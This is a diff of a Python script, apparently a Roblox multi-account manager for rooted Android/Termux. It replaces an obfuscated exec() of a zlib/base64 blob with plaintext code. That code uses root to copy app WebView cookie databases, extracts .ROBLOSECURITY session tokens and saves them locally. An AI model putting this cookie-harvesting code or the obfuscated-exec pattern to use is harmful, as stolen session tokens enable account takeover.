@@ -1,2 +1,180 @@
-import zlib,base64
-exec(zlib.decompress(base64.b64decode(b"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")).decode("utf-8"))
+import os
+import sys
+import glob
+import time
+import json
+import sqlite3
+import subprocess
+import urllib.request
+from datetime import datetime
+
+LOOP_INTERVAL = 10
+MIN_TOKEN_LENGTH = 500
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+PROJECT_ROOT = os.path.abspath(os.path.join(BASE_DIR, "..", ".."))
+
+def limpar_zumbis():
+    print("[🧹] Limpando processos zumbis, travas e scripts temporários...")
+    try:
+        os.system("pkill -f 'picture_profile' > /dev/null 2>&1")
+        os.system("proot-distro login ubuntu -- pkill -f 'picture_profile' > /dev/null 2>&1")
+    except Exception: pass
+
+    try:
+        data_dir = get_data_dir()
+        for lock in glob.glob(os.path.join(data_dir, ".lock_*")):
+            try: os.remove(lock)
+            except: pass
+        for tmp_py in glob.glob(os.path.join(data_dir, ".run_profile_*.py")):
+            try: os.remove(tmp_py)
+            except: pass
+    except Exception: pass
+
+def get_data_dir():
+    data_dir = os.path.join(PROJECT_ROOT, "Data")
+    os.makedirs(data_dir, exist_ok=True)
+    return data_dir
+
+def verificar_ou_criar_tarefas_pendentes():
+    data_dir = get_data_dir()
+    tasks_file = os.path.join(data_dir, "scheduled_tasks.json")
+    if not os.path.exists(tasks_file):
+        try:
+            with open(tasks_file, "w", encoding="utf-8") as f:
+                json.dump({"roblox_radar": "Pending"}, f, indent=4, ensure_ascii=False)
+            print("[📋] Arquivo universal de rotinas criado.")
+        except: pass
+
+def load_saved_tokens():
+    json_path = os.path.join(get_data_dir(), "Roblox_token.json")
+    if os.path.exists(json_path):
+        try:
+            with open(json_path, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except: return {}
+    return {}
+
+def save_to_json(dados_salvos):
+    json_path = os.path.join(get_data_dir(), "Roblox_token.json")
+    with open(json_path, "w", encoding="utf-8") as f:
+        json.dump(dados_salvos, f, indent=4, ensure_ascii=False)
+
+def get_roblox_username(token):
+    try:
+        req = urllib.request.Request(
+            "https://users.roblox.com/v1/users/authenticated",
+            headers={"Cookie": f".ROBLOSECURITY={token}", "User-Agent": "Roblox/WinInet"}
+        )
+        with urllib.request.urlopen(req, timeout=5) as response:
+            return json.loads(response.read().decode()).get("name")
+    except: return None
+
+def extract_active_token(pkg):
+    """Puxa APENAS o token atual (Focus) que está no cookie do WebView"""
+    locais_db = [
+        f"/data/data/{pkg}/app_webview/Default/Cookies",
+        f"/data/data/{pkg}/app_webview/Default/Network/Cookies"
+    ]
+    
+    for db_origem in locais_db:
+        db_temp = f"/data/data/com.termux/files/home/temp_cookie_{pkg}.db"
+        try:
+            subprocess.run(f"su -c 'cp {db_origem} {db_temp} && chmod 777 {db_temp}'", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+        except: continue
+
+        if os.path.exists(db_temp):
+            token_ativo = None
+            try:
+                conn = sqlite3.connect(db_temp)
+                cursor = conn.cursor()
+                cursor.execute("SELECT value FROM cookies WHERE name='.ROBLOSECURITY' ORDER BY last_access_utc DESC LIMIT 1")
+                row = cursor.fetchone()
+                conn.close()
+
+                if row and row[0] and "_|WARNING" in row[0] and len(row[0]) >= MIN_TOKEN_LENGTH:
+                    token_ativo = row[0]
+            except: pass
+            finally:
+                if os.path.exists(db_temp):
+                    os.remove(db_temp)
+            
+            if token_ativo:
+                return token_ativo
+    return None
+
+def monitor_loop():
+    limpar_zumbis()
+    verificar_ou_criar_tarefas_pendentes()
+    print(f"\n[🔄 MONITOR] Vigia de tokens multiplataforma ativa (Ciclo: {LOOP_INTERVAL}s)...")
+    sys.stdout.flush()
+
+    while True:
+        try:
+            try:
+                cmd = "su -c 'ls /data/data | grep -i roblox'"
+                resultado = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8').strip()
+                pacotes = [p for p in resultado.split('\n') if p]
+            except: pacotes = []
+
+            dados_salvos = load_saved_tokens()
+            houve_mudanca = False
+
+            # Limpa APKs que foram desinstalados
+            pacotes_salvos = list(dados_salvos.keys())
+            for pkg_salvo in pacotes_salvos:
+                if pkg_salvo not in pacotes:
+                    print(f"[🗑️] APK {pkg_salvo} desinstalado. Removendo do registro...")
+                    del dados_salvos[pkg_salvo]
+                    houve_mudanca = True
+
+            for pkg in pacotes:
+                token_ativo = extract_active_token(pkg)
+                if not token_ativo: continue
+                
+                if pkg not in dados_salvos:
+                    dados_salvos[pkg] = {}
+
+                username = get_roblox_username(token_ativo)
+                if not username:
+                    username = f"Conta_Desconhecida_{pkg}"
+
+                # Tira o Focus de TODAS as contas desse pacote e converte formato antigo pra novo
+                for user, info in dados_salvos[pkg].items():
+                    if isinstance(info, dict):
+                        if info.get("Focus", False):
+                            dados_salvos[pkg][user]["Focus"] = False
+                            houve_mudanca = True
+                    elif isinstance(info, str):
+                        dados_salvos[pkg][user] = {"token": info, "Focus": False}
+                        houve_mudanca = True
+
+                # Define a conta extraída do Cookie como a conta FOCUS atual
+                conta_anterior = dados_salvos[pkg].get(username, {})
+                token_anterior = conta_anterior.get("token", "")
+
+                if token_ativo != token_anterior:
+                    print(f"\n⭐ [NOVO LOGIN / ATUALIZOU] Pacote: {pkg} | Conta Focus: {username}")
+                    dados_salvos[pkg][username] = {"token": token_ativo, "Focus": True}
+                    houve_mudanca = True
+                else:
+                    # Se o token for igual, mas ela não era o Focus, agora ela é
+                    if not conta_anterior.get("Focus", False):
+                        print(f"\n⭐ [MUDANÇA DE FOCO] A conta {username} agora é a principal em {pkg}")
+                        dados_salvos[pkg][username]["Focus"] = True
+                        houve_mudanca = True
+
+            if houve_mudanca:
+                save_to_json(dados_salvos)
+
+        except KeyboardInterrupt:
+            print("\n[🛑] Encerrando...")
+            limpar_zumbis()
+            sys.exit(0)
+        except Exception as e:
+            pass # Silencia erros no loop para não floodar a tela
+            
+        time.sleep(LOOP_INTERVAL)
+
+if __name__ == "__main__":
+    monitor_loop()
